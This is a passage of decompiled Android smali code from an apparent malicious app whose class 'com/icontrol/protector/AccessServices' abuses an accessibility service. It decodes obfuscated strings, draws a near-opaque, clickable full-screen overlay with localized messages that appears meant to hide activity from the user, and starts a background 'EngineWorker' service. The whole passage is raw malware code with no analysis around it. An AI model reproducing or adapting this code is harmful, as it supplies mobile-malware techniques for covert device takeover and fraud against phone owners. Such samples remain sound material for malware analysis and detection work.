    invoke-static {v3, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-virtual {p0, v3}, Landroid/content/Context;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v3

    check-cast v3, Landroid/view/WindowManager;

    new-instance v5, Landroid/view/View;

    invoke-virtual {p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v7

    invoke-direct {v5, v7}, Landroid/view/View;-><init>(Landroid/content/Context;)V

    new-instance v7, Landroid/view/WindowManager$LayoutParams;

    const/4 v10, 0x1

    const/4 v11, 0x1

    const/16 v12, 0x7f0

    const v13, -0x7fb3f9e8

    const/4 v14, -0x3

    move-object v9, v7

    invoke-direct/range {v9 .. v14}, Landroid/view/WindowManager$LayoutParams;-><init>(IIIII)V

    const/16 v9, 0x33

    iput v9, v7, Landroid/view/WindowManager$LayoutParams;->gravity:I

    sput-object v7, Lcom/icontrol/protector/AccessServices;->w:Landroid/view/WindowManager$LayoutParams;

    sput-object v3, Lcom/icontrol/protector/AccessServices;->v:Landroid/view/WindowManager;

    sput-object v3, Lcom/icontrol/protector/AccessServices;->x:Landroid/view/WindowManager;

    invoke-interface {v3, v5, v7}, Landroid/view/ViewManager;->addView(Landroid/view/View;Landroid/view/ViewGroup$LayoutParams;)V
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    :catch_1
    :try_start_2
    new-instance v3, Landroid/widget/TextView;

    invoke-virtual {p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v5

    invoke-direct {v3, v5}, Landroid/widget/TextView;-><init>(Landroid/content/Context;)V

    sput-object v3, Lcom/icontrol/protector/AccessServices;->L:Landroid/widget/TextView;

    invoke-virtual {p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v3

    invoke-static {v3}, Lcom/icontrol/protector/n;->E(Landroid/content/Context;)Ljava/lang/String;

    invoke-static {}, Ljava/util/Locale;->getDefault()Ljava/util/Locale;

    move-result-object v3

    invoke-virtual {v3}, Ljava/util/Locale;->getLanguage()Ljava/lang/String;

    move-result-object v3

    invoke-virtual {v3}, Ljava/lang/String;->hashCode()I

    move-result v5

    const/16 v7, 0xc31

    const/4 v9, 0x2

    if-eq v5, v7, :cond_9

    const/16 v7, 0xca9

    if-eq v5, v7, :cond_8

    const/16 v7, 0xcae

    if-eq v5, v7, :cond_7

    const/16 v4, 0xe04

    if-eq v5, v4, :cond_6

    const/16 v4, 0xe43

    if-eq v5, v4, :cond_5

    const/16 v4, 0xe7e

    if-eq v5, v4, :cond_4

    const/16 v4, 0xf2e

    if-eq v5, v4, :cond_3

    goto/16 :goto_4

    :cond_3
    new-array v4, v9, [B

    fill-array-data v4, :array_8

    new-array v5, v6, [B

    fill-array-data v5, :array_9

    invoke-static {v4, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_a

    move v4, v9

    goto/16 :goto_5

    :cond_4
    new-array v4, v9, [B

    fill-array-data v4, :array_a

    new-array v5, v6, [B

    fill-array-data v5, :array_b

    invoke-static {v4, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_a

    const/4 v4, 0x3

    goto/16 :goto_5

    :cond_5
    new-array v4, v9, [B

    fill-array-data v4, :array_c

    new-array v5, v6, [B

    fill-array-data v5, :array_d

    invoke-static {v4, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_a

    const/4 v4, 0x5

    goto :goto_5

    :cond_6
    new-array v4, v9, [B

    fill-array-data v4, :array_e

    new-array v5, v6, [B

    fill-array-data v5, :array_f

    invoke-static {v4, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_a

    move v4, v8

    goto :goto_5

    :cond_7
    new-array v5, v9, [B

    fill-array-data v5, :array_10

    new-array v7, v6, [B

    fill-array-data v7, :array_11

    invoke-static {v5, v7}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v5

    invoke-virtual {v3, v5}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_a

    goto :goto_5

    :cond_8
    new-array v4, v9, [B

    fill-array-data v4, :array_12

    new-array v5, v6, [B

    fill-array-data v5, :array_13

    invoke-static {v4, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_a

    move v4, v1

    goto :goto_5

    :cond_9
    new-array v4, v9, [B

    fill-array-data v4, :array_14

    new-array v5, v6, [B

    fill-array-data v5, :array_15

    invoke-static {v4, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v3, v4}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v3

    if-eqz v3, :cond_a

    const/4 v4, 0x1

    goto :goto_5

    :cond_a
    :goto_4
    move v4, v2

    :goto_5
    const/16 v3, 0x17

    const/16 v5, 0x20

    packed-switch v4, :pswitch_data_0

    sget-object v4, Lcom/icontrol/protector/AccessServices;->L:Landroid/widget/TextView;

    new-array v3, v3, [B

    fill-array-data v3, :array_16

    new-array v5, v6, [B

    fill-array-data v5, :array_17

    invoke-static {v3, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v3

    :goto_6
    invoke-virtual {v4, v3}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    goto/16 :goto_8

    :pswitch_0
    sget-object v3, Lcom/icontrol/protector/AccessServices;->L:Landroid/widget/TextView;

    const/16 v4, 0x1d

    new-array v4, v4, [B

    fill-array-data v4, :array_18

    new-array v5, v6, [B

    fill-array-data v5, :array_19

    invoke-static {v4, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v4

    :goto_7
    invoke-virtual {v3, v4}, Landroid/widget/TextView;->setText(Ljava/lang/CharSequence;)V

    goto :goto_8

    :pswitch_1
    sget-object v3, Lcom/icontrol/protector/AccessServices;->L:Landroid/widget/TextView;

    const/16 v4, 0x3c

    new-array v4, v4, [B

    fill-array-data v4, :array_1a

    new-array v5, v6, [B

    fill-array-data v5, :array_1b

    invoke-static {v4, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v4

    goto :goto_7

    :pswitch_2
    sget-object v3, Lcom/icontrol/protector/AccessServices;->L:Landroid/widget/TextView;

    new-array v4, v5, [B

    fill-array-data v4, :array_1c

    new-array v5, v6, [B

    fill-array-data v5, :array_1d

    invoke-static {v4, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v4

    goto :goto_7

    :pswitch_3
    sget-object v3, Lcom/icontrol/protector/AccessServices;->L:Landroid/widget/TextView;

    new-array v4, v5, [B

    fill-array-data v4, :array_1e

    new-array v5, v6, [B

    fill-array-data v5, :array_1f

    invoke-static {v4, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v4

    goto :goto_7

    :pswitch_4
    sget-object v3, Lcom/icontrol/protector/AccessServices;->L:Landroid/widget/TextView;

    const/16 v4, 0x18

    new-array v4, v4, [B

    fill-array-data v4, :array_20

    new-array v5, v6, [B

    fill-array-data v5, :array_21

    invoke-static {v4, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v4

    goto :goto_7

    :pswitch_5
    sget-object v3, Lcom/icontrol/protector/AccessServices;->L:Landroid/widget/TextView;

    const/16 v4, 0x36

    new-array v4, v4, [B

    fill-array-data v4, :array_22

    new-array v5, v6, [B

    fill-array-data v5, :array_23

    invoke-static {v4, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v4

    goto :goto_7

    :pswitch_6
    sget-object v4, Lcom/icontrol/protector/AccessServices;->L:Landroid/widget/TextView;

    new-array v3, v3, [B

    fill-array-data v3, :array_24

    new-array v5, v6, [B

    fill-array-data v5, :array_25

    invoke-static {v3, v5}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v3

    goto/16 :goto_6

    :goto_8
    sget-object v3, Lcom/icontrol/protector/AccessServices;->L:Landroid/widget/TextView;

    invoke-virtual {v3, v2}, Landroid/widget/TextView;->setTextColor(I)V

    sget-object v2, Lcom/icontrol/protector/AccessServices;->L:Landroid/widget/TextView;

    const/high16 v3, 0x41a00000    # 20.0f

    invoke-virtual {v2, v3}, Landroid/widget/TextView;->setTextSize(F)V

    sget-object v2, Lcom/icontrol/protector/AccessServices;->L:Landroid/widget/TextView;

    const/16 v3, 0x11

    invoke-virtual {v2, v3}, Landroid/widget/TextView;->setGravity(I)V

    new-instance v2, Landroid/widget/FrameLayout$LayoutParams;

    const/4 v4, -0x2

    invoke-direct {v2, v4, v4}, Landroid/widget/FrameLayout$LayoutParams;-><init>(II)V

    iput v3, v2, Landroid/widget/FrameLayout$LayoutParams;->gravity:I

    sget-object v3, Lcom/icontrol/protector/AccessServices;->L:Landroid/widget/TextView;

    invoke-virtual {v3, v2}, Landroid/view/View;->setLayoutParams(Landroid/view/ViewGroup$LayoutParams;)V

    new-instance v2, Landroid/widget/FrameLayout;

    invoke-virtual {p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v3

    invoke-direct {v2, v3}, Landroid/widget/FrameLayout;-><init>(Landroid/content/Context;)V

    sput-object v2, Lcom/icontrol/protector/AccessServices;->J:Landroid/widget/FrameLayout;

    const/4 v3, 0x7

    new-array v3, v3, [B

    fill-array-data v3, :array_26

    new-array v4, v6, [B

    fill-array-data v4, :array_27

    invoke-static {v3, v4}, Lntidisestablish/neumonoul/floccinaucinih/r10;->a([B[B)Ljava/lang/String;

    move-result-object v3

    invoke-static {v3}, Landroid/graphics/Color;->parseColor(Ljava/lang/String;)I

    move-result v3

    invoke-virtual {v2, v3}, Landroid/view/View;->setBackgroundColor(I)V

    sget-object v2, Lcom/icontrol/protector/AccessServices;->J:Landroid/widget/FrameLayout;

    invoke-virtual {v2}, Landroid/view/View;->getBackground()Landroid/graphics/drawable/Drawable;

    move-result-object v2

    const/16 v3, 0xfc

    invoke-virtual {v2, v3}, Landroid/graphics/drawable/Drawable;->setAlpha(I)V

    sget-object v2, Lcom/icontrol/protector/AccessServices;->J:Landroid/widget/FrameLayout;

    invoke-virtual {v2, v1}, Landroid/view/View;->setClickable(Z)V

    sget-object v1, Lcom/icontrol/protector/AccessServices;->J:Landroid/widget/FrameLayout;

    sget-object v2, Lcom/icontrol/protector/AccessServices;->L:Landroid/widget/TextView;

    invoke-virtual {v1, v2}, Landroid/view/ViewGroup;->addView(Landroid/view/View;)V

    new-instance v1, Landroid/view/WindowManager$LayoutParams;

    iget v4, p0, Lcom/icontrol/protector/AccessServices;->g:I

    iget v5, p0, Lcom/icontrol/protector/AccessServices;->h:I

    const/16 v6, 0x7f0

    const v7, 0x90718

    const/4 v8, 0x1

    move-object v3, v1

    invoke-direct/range {v3 .. v8}, Landroid/view/WindowManager$LayoutParams;-><init>(IIIII)V

    sput-object v1, Lcom/icontrol/protector/AccessServices;->K:Landroid/view/WindowManager$LayoutParams;

    const v2, 0x800033

    iput v2, v1, Landroid/view/WindowManager$LayoutParams;->gravity:I
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_2

    :catch_2
    new-instance v1, Landroid/content/Intent;

    invoke-virtual {p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    const-class v3, Lcom/icontrol/protector/EngineWorker;

    invoke-direct {v1, v2, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v2

    invoke-static {v2, v3}, Lntidisestablish/neumonoul/floccinaucinih/q8;->a(Landroid/content/Context;Ljava/lang/Class;)Z

    move-result v2

    if-nez v2, :cond_c

    sget v2, Landroid/os/Build$VERSION;->SDK_INT:I

    if-lt v2, v0, :cond_b

    invoke-static {p0, v1}, Lntidisestablish/neumonoul/floccinaucinih/w;->a(Lcom/icontrol/protector/AccessServices;Landroid/content/Intent;)Landroid/content/ComponentName;

    goto :goto_9

    :cond_b
    invoke-virtual {p0, v1}, Landroid/content/Context;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    :cond_c
    :goto_9
    return-void

    :pswitch_data_0
    .packed-switch 0x0
        :pswitch_6
        :pswitch_5
        :pswitch_4
        :pswitch_3
        :pswitch_2
        :pswitch_1
        :pswitch_0
    .end packed-switch

    :array_0
    .array-data 1
        0x3at
        -0xdt
        -0x37t
        -0x6ft
        -0x15t
        0x17t
    .end array-data

    nop

    :array_1
    .array-data 1
        0x4dt
        -0x66t
        -0x59t
        -0xbt
        -0x7ct
        0x60t
        -0x51t
        -0x2at
    .end array-data

    :array_2
    .array-data 1
        -0x11t
        -0x5at
        0x34t
        0x46t
    .end array-data

    :array_3
    .array-data 1
        -0x48t
        -0x2bt
        0x57t
        0x34t
        0x1et
        -0x25t
        0x60t
        0x40t
    .end array-data

    :array_4
    .array-data 1
        0x33t
        0x22t
        -0x77t
        0x24t
    .end array-data

    :array_5
    .array-data 1
        0x7bt
        0x51t
        -0x16t
        0x56t
        -0x66t
        -0x70t
        -0x69t
        -0x61t
    .end array-data

    :array_6
    .array-data 1
        -0x4bt
        -0x3bt
        0x48t
        0x5ft
        -0x63t
        -0x5ct
    .end array-data

    nop

    :array_7
    .array-data 1
        -0x3et
        -0x54t
        0x26t
        0x3bt
        -0xet
        -0x2dt
        -0x65t
        0x5bt
    .end array-data

    :array_8
    .array-data 1
        -0x6ct
        -0x3ft
    .end array-data

    nop

    :array_9
    .array-data 1
        -0x12t
        -0x57t
        -0x63t
        -0x3bt
        -0x2bt
        0x51t
        0x7at
        0x3et
    .end array-data

    :array_a
    .array-data 1
        0x4ct
        -0x4at
    .end array-data

    nop

    :array_b
    .array-data 1
        0x38t
        -0x3ct
        -0x12t
        -0x20t
        0x61t
        -0xbt
        -0x7ct
        0x2et
    .end array-data

    :array_c
    .array-data 1
        -0x3ct
        0x52t
    .end array-data

    nop

    :array_d
    .array-data 1
        -0x4at
        0x27t
        -0xct
        0x6t
        0x3ft
        0x22t
        0x41t
        0x38t
    .end array-data

    :array_e
    .array-data 1
        -0x21t
        0x32t
    .end array-data

    nop

    :array_f
    .array-data 1
        -0x51t
        0x46t
        0x2dt
        -0x13t
        -0x3ct
        0x1t
        -0x1t
        -0x12t
    .end array-data

    :array_10
    .array-data 1
        -0x24t
        -0x57t
    .end array-data

    nop

    :array_11
    .array-data 1
        -0x47t
        -0x26t
        -0x67t
        -0x4ft
        0x59t
        -0xdt
        0xdt
        0x30t
    .end array-data

    :array_12
    .array-data 1
        -0x13t
        0x11t
    .end array-data

    nop

    :array_13
    .array-data 1
        -0x78t
        0x7ft
        -0x32t
        -0x59t
        -0xbt
        -0x4dt
        -0x5ft
        0x1ft
    .end array-data

    :array_14
    .array-data 1
        -0x45t
        -0x4t
    .end array-data

    nop

    :array_15
    .array-data 1
        -0x26t
        -0x72t
        0x1bt
        0xct
        0x50t
        -0x56t
        0x62t
        -0x50t
    .end array-data

    :array_16
    .array-data 1
        -0x63t
        -0x58t
        0x47t
        0x5ct
        0x4et
        0x57t
        0xbt
        -0x8t
        -0xft
        -0x69t
        0x4at
        0x5dt
        0x46t
        0x4at
        0x9t
        -0xct
        -0x5at
        -0x5at
        0x4ft
        0x4ct
        0x9t
        0x17t
        0x42t
    .end array-data

    :array_17
    .array-data 1
        -0x2ft
        -0x39t
        0x26t
        0x38t
        0x27t
        0x39t
        0x6ct
        -0x2ct
    .end array-data

    :array_18
    .array-data 1
        0x17t
        -0x61t
        0x63t
        0x5dt
        0xct
        -0x6et
        0x34t
        -0x40t
        0x78t
        -0x22t
        0x61t
        0x55t
        0x1ft
        -0x24t
        0x36t
        -0x32t
        0x22t
        -0x6ft
        0x63t
        0x1at
        0x8t
        -0x71t
        0x20t
        -0x36t
        0x26t
        -0x65t
        0x3ft
        0x14t
        0x43t
    .end array-data

    nop

    :array_19
    .array-data 1
        0x54t
        -0x2t
        0x11t
        0x3at
        0x6dt
        -0x4t
        0x50t
        -0x51t
    .end array-data

    :array_1a
    .array-data 1
        0x57t
        -0x4ct
        0x51t
        0x5ft
        -0x53t
        -0x20t
        -0x68t
        -0x10t
        0x56t
        -0x60t
        0x51t
        0x58t
        -0x53t
        -0x17t
        -0x67t
        -0x40t
        -0x55t
        0x3t
        0x51t
        0x50t
        -0x53t
        -0x13t
        -0x67t
        -0x3at
        0x57t
        -0x6dt
        0x51t
        0x54t
        -0x54t
        -0x30t
        -0x67t
        -0x37t
        0x56t
        -0x5et
        0x50t
        0x6dt
        -0x53t
        -0x1dt
        0x69t
        -0x60t
        0x38t
        -0xdt
        0x3ft
        0x3ft
        -0x37t
        -0x7dt
        -0x9t
        -0x60t
        0x31t
        -0xdt
        0x35t
        0x3ft
        -0x3bt
        -0x7et
        -0x35t
        -0x60t
        0x32t
        0xdt
        -0x51t
        -0x3ft
    .end array-data

    :array_1b
    .array-data 1
        -0x79t
        0x23t
        -0x7ft
        -0x11t
        0x7dt
        0x53t
        0x49t
        0x70t
    .end array-data

    :array_1c
    .array-data 1
        0x3bt
        0x68t
        -0x20t
        -0x19t
        -0x29t
        -0x7ft
        -0x1et
        -0x51t
        0x1ct
        0x66t
        -0x42t
        -0x4bt
        -0x3et
        -0x77t
        -0xft
        -0x1ft
        0x1et
        0x68t
        -0x1ct
        -0x6t
        -0x40t
        -0x3at
        -0x1et
        -0x5at
        0xdt
        0x68t
        -0x20t
        -0xft
        -0x29t
        -0x38t
        -0x53t
        -0x11t
    .end array-data

    :array_1d
    .array-data 1
        0x78t
        0x9t
        -0x6et
        -0x6bt
        -0x4et
        -0x1at
        -0x7dt
        -0x3ft
    .end array-data

    :array_1e
    .array-data 1
        0x3ct
        0x3dt
        -0x8t
        0xft
        0x10t
        -0x5at
        0x37t
        0x3et
        0x1ct
        -0x6ft
        0x36t
        0x48t
        0x5ct
        -0x51t
        -0x66t
        -0x15t
        0x11t
        -0x68t
        0x21t
        0xat
        0x5ct
        -0x5ft
        0x3ct
        0x3ct
        0x9t
        -0x65t
        0x3dt
        0xdt
        0x12t
        -0x13t
        0x77t
        0x79t
    .end array-data

    :array_1f
    .array-data 1
        0x65t
        -0x2t
        0x44t
        0x64t
        0x7ct
        -0x3dt
        0x59t
        0x57t
    .end array-data

    :array_20
    .array-data 1
        -0x5ft
        -0x7ct
        -0x50t
        -0x58t
        -0x22t
        -0x4dt
        -0x55t
        -0x60t
        -0x17t
        -0x1ft
        -0x54t
        -0x34t
        -0x75t
        -0x5ft
        -0x8t
        -0x1t
        -0x14t
        -0x7dt
        -0xbt
        -0x40t
        -0x6t
        0x20t
        0x61t
        0x36t
    .end array-data

    :array_21
    .array-data 1
        0x44t
        0xet
        0x10t
        0x40t
        0x63t
        0xet
        0x4ft
        0x18t
    .end array-data

    :array_22
    .array-data 1
        0x2et
        -0x45t
        -0x2bt
        -0x29t
        0x67t
        0x17t
        -0x5at
        -0x61t
        -0x2at
        -0x31t
        -0x56t
        -0x57t
        0x3bt
        0x7et
        -0x2bt
        -0x33t
        0x5bt
        -0x32t
        -0x78t
        -0x57t
        0x35t
        0x7ft
        -0x5t
        -0x33t
        0x7at
        0x37t
        -0x2ct
        -0x6t
        0x67t
        0x17t
        -0x59t
        -0x47t
        0x2ft
        -0x62t
        0x2dt
        -0x58t
        0x18t
        0x7ft
        -0x5t
        -0x33t
        0x51t
        -0x32t
        -0x75t
        -0x58t
        0x15t
        0x7et
        -0x39t
        -0x33t
        0x51t
        -0x31t
        -0x44t
        0x5et
        -0x6ft
        -0x78t
    .end array-data

    nop

    :array_23
    .array-data 1
        -0xat
        0x17t
        0xdt
        0x70t
        -0x41t
        -0x5at
        0x7ft
        0x15t
    .end array-data

    :array_24
    .array-data 1
        -0x42t
        -0x40t
        -0x54t
        -0x4ft
        -0x13t
        0x56t
        -0x78t
        -0x13t
        -0x2et
        -0x1t
        -0x5ft
        -0x50t
        -0x1bt
        0x4bt
        -0x76t
        -0x1ft
        -0x7bt
        -0x32t
        -0x5ct
        -0x5ft
        -0x56t
        0x16t
        -0x3ft
    .end array-data

    :array_25
    .array-data 1
        -0xet
        -0x51t
        -0x33t
        -0x2bt
        -0x7ct
        0x38t
        -0x11t
        -0x3ft
    .end array-data

    :array_26
    .array-data 1
        -0x7t
        -0x7ft
        -0x73t
        0x69t
        0x8t
        -0x25t
        -0x6t
    .end array-data

    :array_27
    .array-data 1
        -0x26t
        -0x4ft
        -0x43t
        0x59t
        0x38t
        -0x15t
        -0x36t
        -0x2ct
    .end array-data
.end method

.method public onStartCommand(Landroid/content/Intent;II)I
    .locals 0

    invoke-virtual {p0}, Landroid/content/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object p1

    invoke-direct {p0, p1}, Lcom/icontrol/protector/AccessServices;->u(Landroid/content/Context;)V

    const/4 p1, 0x1

    return p1
.end method

.method public setAccessibilityFocusAppearance(II)V
    .locals 0

    invoke-super {p0, p1, p2}, Landroid/accessibilityservice/AccessibilityService;->setAccessibilityFocusAppearance(II)V

    return-void
.end method

.method public setGestureDetectionPassthroughRegion(ILandroid/graphics/Region;)V
    .locals 0

    invoke-super {p0, p1, p2}, Landroid/accessibilityservice/AccessibilityService;->setGestureDetectionPassthroughRegion(ILandroid/graphics/Region;)V

    return-void
.end method

.method public setTouchExplorationPassthroughRegion(ILandroid/graphics/Region;)V
    .locals 0

    invoke-super {p0, p1, p2}, Landroid/accessibilityservice/AccessibilityService;->setTouchExplorationPassthroughRegion(ILandroid/graphics/Region;)V

    return-void
.end method

.method public takeScreenshot(ILjava/util/concurrent/Executor;Landroid/accessibilityservice/AccessibilityService$TakeScreenshotCallback;)V
    .locals 0

    invoke-super {p0, p1, p2, p3}, Landroid/accessibilityservice/AccessibilityService;->takeScreenshot(ILjava/util/concurrent/Executor;Landroid/accessibilityservice/AccessibilityService$TakeScreenshotCallback;)V

    return-void
.end method
